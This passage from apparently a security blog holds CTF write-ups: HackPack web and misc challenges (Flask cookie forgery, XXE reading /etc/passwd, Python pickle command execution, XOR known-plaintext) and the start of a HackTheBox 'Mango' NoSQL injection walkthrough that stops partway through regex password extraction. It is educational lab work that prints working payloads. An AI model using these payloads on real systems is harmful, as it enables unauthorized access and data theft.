&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ flask-unsign --sign --secret password1 --cookie &amp;quot;{&amp;#39;flagship&amp;#39;: True, &amp;#39;username&amp;#39;: &amp;#39;toto&amp;#39;}&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;eyJmbGFnc2hpcCI6dHJ1ZSwidXNlcm5hbWUiOiJ0b3RvIn0.Xp2TRQ.XlXCKJYANDb9ghp5ms_fKQhTkVY&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using Burp repeater we modify our cookie to get the flag&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /flag HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: cookie-forge.cha.hackpack.club&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: session=eyJmbGFnc2hpcCI6dHJ1ZSwidXNlcm5hbWUiOiJ0b3RvIn0.Xp2TRQ.XlXCKJYANDb9ghp5ms_fKQhTkVY&lt;/span&gt;
&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;HTTP/1.1 200 OK&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 2617&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="code-line"&gt;Date: Mon, 20 Apr 2020 12:26:22 GMT&lt;/span&gt;
&lt;span class="code-line"&gt;Server: meinheld/1.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;Vary: Cookie&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;p&amp;gt;You are a &amp;lt;em&amp;gt;special&amp;lt;/em&amp;gt; customer!&lt;/span&gt;
&lt;span class="code-line"&gt;    To come back for more, sugar-coma after sugar-coma, in the face of mounting pressure from your doctors,&lt;/span&gt;
&lt;span class="code-line"&gt;    your family, and your own common sense&amp;amp;hellip;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;strong&amp;gt;That&amp;#39;s&amp;lt;/strong&amp;gt; dedication.&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;p&amp;gt;Just to show our appreciation for your morbid commitment to our life-altering products, we&amp;#39;re giving you this flag:&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;code&amp;gt;flag{0h_my_@ch1ng_p@ncre@5_th33$3_@r3_d3l1c10$0}&amp;lt;/code&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="custom-ui"&gt;Custom UI&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;How often do you visit the website just to bounce back because of bad design? Now we developed a new feature, which gives you the ability to change the design! Check out a new feature: https://custom-ui.cha.hackpack.club/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="page" src="/media/2020.04/hackpack_custom_ui.png"&gt;&lt;/p&gt;
&lt;p&gt;We can input data to change the button color and add text to it. If we input
&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; we trigger an error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Warning: DOMDocument::loadXML(): Opening and ending tag mismatch: script line 1 and value in Entity, line: 1 in /var/www/html/index.php on line 12&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: DOMDocument::loadXML(): Opening and ending tag mismatch: value line 1 and button in Entity, line: 1 in /var/www/html/index.php on line 12&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: DOMDocument::loadXML(): Premature end of data in tag button line 1 in Entity, line: 1 in /var/www/html/index.php on line 12&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: simplexml_import_dom(): Invalid Nodetype to import in /var/www/html/index.php on line 13&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Therefore we will go for a &lt;a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection"&gt;XML External Entity (XXE) Injection&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /? HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: custom-ui.cha.hackpack.club&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: debug=false&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 198&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxez1rnx%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxez1rnx%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;div style=&amp;quot;max-width:600px; margin:auto&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;h1&amp;gt;Your custom button!&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;lt;button style=&amp;quot;background-color: root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;_apt:x:100:65534::/nonexistent:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;; padding: 15px 32px;&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We change the &lt;code&gt;debug&lt;/code&gt; cookie to &lt;code&gt;true&lt;/code&gt; and we get a comment at the bottom of the
page: &lt;code&gt;&amp;lt;!-- TODO: Delete flag.txt from /etc/ --&amp;gt;&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /? HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: custom-ui.cha.hackpack.club&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: debug=false&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 200&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxez1rnx%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fflag.txt%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxez1rnx%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;button style=&amp;quot;background-color: flag{d1d_y0u_kn0w_th@t_xml_can_run_code?}; padding: 15px 32px;&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="misc"&gt;Misc&lt;/h1&gt;
&lt;h2 id="ssme"&gt;SSME&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to our Super Secure Message Encrypter (SSME - copyright pending)
nc cha.hackpack.club 41704&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We connect to the service. We encrypt the string &lt;code&gt;qq&lt;/code&gt; and decode it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nc cha.hackpack.club 41704&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Welcome to our Super Secure Message Encrypter (SSME - copyright pending)&lt;/span&gt;
&lt;span class="code-line"&gt;[*] We use patented technology that only we have access to in order to safely encrypt your data&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Please use this tool to encrypt/decrypt messages&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Please select from the following options&lt;/span&gt;
&lt;span class="code-line"&gt;1.) Encrypt a message&lt;/span&gt;
&lt;span class="code-line"&gt;2.) Read a message&lt;/span&gt;
&lt;span class="code-line"&gt;3.) Quit&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; 1&lt;/span&gt;
&lt;span class="code-line"&gt;What would you like to encrypt? qq&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Message encrypted: gANYAgAAAHFxcQAu&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Please select from the following options&lt;/span&gt;
&lt;span class="code-line"&gt;1.) Encrypt a message&lt;/span&gt;
&lt;span class="code-line"&gt;2.) Read a message&lt;/span&gt;
&lt;span class="code-line"&gt;3.) Quit&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; 2&lt;/span&gt;
&lt;span class="code-line"&gt;Please enter the encrypted string here: gANYAgAAAHFxcQAu&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Message decrypted: qq&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we send a malformed input for the decryption, that generate an error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[*] Please select from the following options&lt;/span&gt;
&lt;span class="code-line"&gt;1.) Encrypt a message&lt;/span&gt;
&lt;span class="code-line"&gt;2.) Read a message&lt;/span&gt;
&lt;span class="code-line"&gt;3.) Quit&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; 2&lt;/span&gt;
&lt;span class="code-line"&gt;Please enter the encrypted string here: gANYAgAAAHFxc&lt;/span&gt;
&lt;span class="code-line"&gt;Traceback (most recent call last):&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/usr/lib/python3.6/encodings/base64_codec.py&amp;quot;, line 19, in base64_decode&lt;/span&gt;
&lt;span class="code-line"&gt;    return (base64.decodebytes(input), len(input))&lt;/span&gt;
&lt;span class="code-line"&gt;  Fle &amp;quot;/usr/lib/python3.6/base64.py&amp;quot;, line 546, in decodebytes&lt;/span&gt;
&lt;span class="code-line"&gt;    return binascii.a2b_base64(s)&lt;/span&gt;
&lt;span class="code-line"&gt;binascii.Error: Incorrect padding&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;The above exception was the direct cause of the following exception:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Traceback (most recent call last):&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/home/challenger/app.py&amp;quot;, line 46, in &amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    main()&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/home/challenger/app.py&amp;quot;, line 37, in main&lt;/span&gt;
&lt;span class="code-line"&gt;    dec = decrypt(to_dec)&lt;/span&gt;
&lt;span class="code-line"&gt;  File &amp;quot;/home/challenger/app.py&amp;quot;, line 24, in decrypt&lt;/span&gt;
&lt;span class="code-line"&gt;    return pickle.loads(codecs.decode(to_dec.encode(), &amp;quot;base64&amp;quot;))&lt;/span&gt;
&lt;span class="code-line"&gt;binascii.Error: decoding with &amp;#39;base64&amp;#39; codec failed (Error: Incorrect padding)i&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The error disclose the use of the python pickle which are know to be vulnerable
an allowing command execution.&lt;/p&gt;
&lt;p&gt;We create a pickle to execute OS commands on the system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import pickle&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; import subprocess&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; import base64&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; class RunBinSh(object):&lt;/span&gt;
&lt;span class="code-line"&gt;...   def __reduce__(self):&lt;/span&gt;
&lt;span class="code-line"&gt;...     return (subprocess.Popen, ((&amp;#39;ls&amp;#39;,),))&lt;/span&gt;
&lt;span class="code-line"&gt;...&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; print base64.b64encode(cPickle.dumps(RunBinSh()))&lt;/span&gt;
&lt;span class="code-line"&gt;b&amp;#39;gASVIwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwCbHOUhZSFlFKULg==&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We decode the generate pickle&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nc cha.hackpack.club 41704&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Welcome to our Super Secure Message Encrypter (SSME - copyright pending)&lt;/span&gt;
&lt;span class="code-line"&gt;[*] We use patented technology that only we have access to in order to safely encrypt your data&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Please use this tool to encrypt/decrypt messages&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Please select from the following options&lt;/span&gt;
&lt;span class="code-line"&gt;1.) Encrypt a message&lt;/span&gt;
&lt;span class="code-line"&gt;2.) Read a message&lt;/span&gt;
&lt;span class="code-line"&gt;3.) Quit&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; 2&lt;/span&gt;
&lt;span class="code-line"&gt;Please enter the encrypted string here: gASVIwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwCbHOUhZSFlFKULg==&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Message decrypted: &amp;lt;subprocess.Popen object at 0x7f2b6d9a9550&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Please select from the following options&lt;/span&gt;
&lt;span class="code-line"&gt;1.) Encrypt a message&lt;/span&gt;
&lt;span class="code-line"&gt;2.) Read a message&lt;/span&gt;
&lt;span class="code-line"&gt;3.) Quit&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; app.py&lt;/span&gt;
&lt;span class="code-line"&gt;flag.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We generate a new pickle to read the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; class RunBinSh(object):&lt;/span&gt;
&lt;span class="code-line"&gt;...   def __reduce__(self):&lt;/span&gt;
&lt;span class="code-line"&gt;...     return (subprocess.Popen, ((&amp;#39;cat&amp;#39;, &amp;#39;flag.txt&amp;#39;,),))&lt;/span&gt;
&lt;span class="code-line"&gt;...&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; print(base64.b64encode(pickle.dumps(RunBinSh())))&lt;/span&gt;
&lt;span class="code-line"&gt;b&amp;#39;gASVLwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwIZmxhZy50eHSUhpSFlFKULg==&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Please enter the encrypted string here: gASVLwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwIZmxhZy50eHSUhpSFlFKULg==&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Message decrypted: &amp;lt;subprocess.Popen object at 0x7f2b6d9a4438&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Please select from the following options&lt;/span&gt;
&lt;span class="code-line"&gt;1.) Encrypt a message&lt;/span&gt;
&lt;span class="code-line"&gt;2.) Read a message&lt;/span&gt;
&lt;span class="code-line"&gt;3.) Quit&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; flag{n3v3R_u$e_p!ckLe_w_uNtru$t3d_d4t4}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="hiding-in-plaintext"&gt;Hiding in Plaintext&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Connect to CryptoKid's Mall of MirrXors at cha.hackpack.club:41715 to try your hand at guessing the flag!
(Mr. Vernam says CryptoKid stole his ideas, but Miss Venona says he stole them...badly...)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We understand that the service is doing XOR encryption. We connect to it and
thee that there is the encrypted flag and that we can encrypt anything we want.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nc cha.hackpack.club 41715&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to CryptoKid&amp;#39;s Hall of MirrXors!&lt;/span&gt;
&lt;span class="code-line"&gt;Here is BASE64(ENC(FLAG, SESSION_KEY)) =&amp;gt; bwHJ1+IUTxTLWyYalXkyC3m5B4lRj+4BerJ3S/WxWj4kKbbqdx/M6nh8bCE+C0ZjJJc9hKHMPSTwUQ==&lt;/span&gt;
&lt;span class="code-line"&gt;Wanna guess what FLAG is? qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&lt;/span&gt;
&lt;span class="code-line"&gt;Here is BASE64(ENC(GUESS, SESSION_KEY)) =&amp;gt; eBzZwegLDhGXXj9YyWVzCXzlR5VQjKwDePJwCamwRw9kNrOofhqQ7Xxhc30tD0M/Io582LP9PmbyXXgc2cHoCw4Rl14/WMllcwl85UeVUIysA3jy&lt;/span&gt;
&lt;span class="code-line"&gt;How&amp;#39;d you do??&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We have a known clear text attack on a XOR encryption. We just need to XOR the
encoded flag to our encrypted plain text &lt;code&gt;qqqqqq…&lt;/code&gt; then XOR it again with our
clear plain text. Here is the
&lt;a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'Base64','string':'eBzZwegLDhGXXj9YyWVzCXzlR5VQjKwDePJwCamwRw9kNrOofhqQ7Xxhc30tD0M/Io582LP9PmbyXXgc2cHoCw4Rl14/WMllcwl85UeVUIysA3jy'%7D,'Standard',false)XOR(%7B'option':'Latin1','string':'qqqqqqqqqqqqq'%7D,'Standard',false)&amp;input=YndISjErSVVUeFRMV3lZYWxYa3lDM201QjRsUmorNEJlckozUy9XeFdqNGtLYmJxZHgvTTZuaDhiQ0UrQzBaakpKYzloS0hNUFNUd1VRPT0"&gt;
Cyber Chef recipe &lt;/a&gt; that give us the flag: &lt;code&gt;flag{n0t-th3-m0st-1mpr3ss1v3-pl@1nt3xt-vuln-but-wh0-c@r3s}&lt;/code&gt;.&lt;/p&gt;
&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This was a nice CTF as the challenges were quite doable.&lt;/p&gt;
&lt;p&gt;&lt;img alt="score board" src="/media/2020.04/hackpack_scoreboard.png"&gt;&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="CTF"></category><category term="web"></category></entry><entry><title>HTB: Mango</title><link href="https://maggick.fr/2020/04/htb-mango.html" rel="alternate"></link><published>2020-04-19T11:25:00+02:00</published><updated>2020-04-19T11:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-19:/2020/04/htb-mango.html</id><summary type="html">&lt;p&gt;&lt;img alt="Mango card" class="align-left" src="/media/2020.04/mango_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/214"&gt;Mango&lt;/a&gt; publish by
&lt;a href="https://www.hackthebox.eu/home/users/profile/13531"&gt;MrR3boot&lt;/a&gt; on October 26
2019.
This box is classified as a medium machine. It involves a interesting NoSQL injection
and a SUID binary.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.04/mango_card.png" alt="Mango card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/214"&gt;Mango&lt;/a&gt; publish by
&lt;a href="https://www.hackthebox.eu/home/users/profile/13531"&gt;MrR3boot&lt;/a&gt; on October 26
2019.
This box is classified as a medium machine. It involves a interesting NoSQL injection
and a SUID binary.&lt;/p&gt;


&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) 80 (HTTP) and 443 (HTTPS) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Nov 21 13:22:00 2019 as: nmap -p- -sSV -oA nmap 10.10.10.162&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.162&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.086s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT    STATE SERVICE  VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Nov 21 13:24:55 2019 -- 1 IP address (1 host up) scanned in 175.48 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;# Web&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can run a dirb on both ports but this won't give use any lead.&lt;/p&gt;
&lt;p&gt;The website on port 443 is a search engine with an analytic part allowing to
connect to a remote elastic search.&lt;/p&gt;
&lt;p&gt;When looking at the SSL certificate we get some information about a subdomain
"staging-order.mango.htb". We add an entry to our &lt;code&gt;/etc/hosts&lt;/code&gt; and are able to
access the website.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Mango certificat" src="/media/2020.04/mango_1.png"&gt;&lt;/p&gt;
&lt;p&gt;The web page is a simple authentication form.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Mango login page" src="/media/2020.04/mango_2.png"&gt;&lt;/p&gt;
&lt;h1 id="nosql-injection"&gt;NoSQL injection&lt;/h1&gt;
&lt;p&gt;The name of the box: Mango is a hint about the framework used. First off all I
thought about &lt;a href="https://www.mongodb.com/"&gt;MangoDB&lt;/a&gt; but there is also a lot of
framework named "mango" like &lt;a href="https://mangomap.com"&gt;Mangomap&lt;/a&gt; or &lt;a href="https://www.mangoapps.com/"&gt;Mangoapps&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;MangoDB is a &lt;a href="https://en.wikipedia.org/wiki/NoSQL"&gt;NoSQL&lt;/a&gt; database. Classical
SQL injections will not work on it. But there is specific
[NoSQL Injection] (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)&lt;/p&gt;
&lt;p&gt;When we try to login as "admin" with the password "place" the POST parameters
are the following: &lt;code&gt;username=admin&amp;amp;password=place&amp;amp;login=login&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We edit the request with Burp and send the following:
&lt;code&gt;username=admin&amp;amp;password[%24ne]=place&amp;amp;login=login&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We bypass the authentication and are logged in as admin. But the new page is
a static page with just some SVG images and a message indicating that the site
is building.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Mango plantation" src="/media/2020.04/mango_3.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;note:&lt;/strong&gt; I realized after exploiting the following that I was not getting the
information about admin password but an other account as my payload have a
&lt;code&gt;[$ne]&lt;/code&gt; (not equal) in the username parameter.&lt;/p&gt;
&lt;p&gt;We can get more information about the admin password's length using some
"regex". By incrementing the following numeric parameter with Burp repeater (or
intruder) in the following query
we can learn that the admin password is 16 characters long. In fact the
application send back a redirection until the parameter is 17 then just sending a 200.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;username[%24ne]=admin&amp;amp;password[%24regex]=.{16}&amp;amp;login=login&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Then we can get the password character by character using the intruder and
&lt;a href="https://github.com/maggick/vrac/blob/master/printable_chars"&gt;a list of printable characters&lt;/a&gt;
and a specific payload. When sorting the application answers by Status code we
get the characters.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Mango getting the password" src="/media/2020.04/mango_4.png"&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;username[%24ne]=admin&amp;amp;password[%24regex]=h3§q§.{13}&amp;amp;login=login&lt;/span&gt;
&lt;span class="code-line"&gt;username[%24ne]=admin&amp;amp;password[%24regex]=h3m§q§.{12}&amp;amp;login=login&lt;/span&gt;
